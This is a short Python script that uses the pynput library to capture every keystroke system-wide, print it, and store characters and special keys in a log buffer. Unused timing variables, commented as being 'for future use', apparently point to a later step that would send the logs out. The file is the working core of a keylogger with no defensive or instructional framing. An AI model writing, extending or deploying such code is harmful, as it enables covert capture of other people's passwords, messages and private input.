from pynput import keyboard
import time

# buffer to store key logs to increase performance
log_buffer = []

# time variables for future use.... (delay)
SEND_INTERVAL = 0
last_sent_time = time.time()

def key_pressed(key):
    try:
        char = key.char
        print(char)
        if char:
            log_buffer.append(char)
    except AttributeError:
        special_key = f"{key}"
        print(special_key)
        log_buffer.append(special_key)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

